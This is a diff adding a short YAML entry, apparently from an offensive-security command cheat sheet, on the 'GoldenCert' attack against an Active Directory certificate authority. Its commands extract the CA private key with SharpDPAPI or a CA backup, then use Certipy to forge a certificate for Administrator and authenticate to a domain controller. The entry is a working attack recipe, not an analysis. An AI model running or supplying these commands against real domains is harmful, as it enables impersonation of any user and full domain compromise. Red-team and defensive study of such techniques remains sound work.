@@ -1,0 +1,14 @@
+name: GoldenCert
+description: CA compromise allows forging certificates for any user
+commands:
+- '# Extract CA private key (requires admin on CA)'
+- SharpDPAPI.exe certificates /machine
+- ''
+- '# Or backup CA via certsrv.msc'
+- '# Certification Authority -> Backup CA -> Include private key'
+- ''
+- '# Forge certificate with Certipy'
+- certipy forge -ca-pfx <CA_PFX> -upn Administrator@<DOMAIN> -subject 'CN=Administrator'
+- certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+opsec: []
+references: []
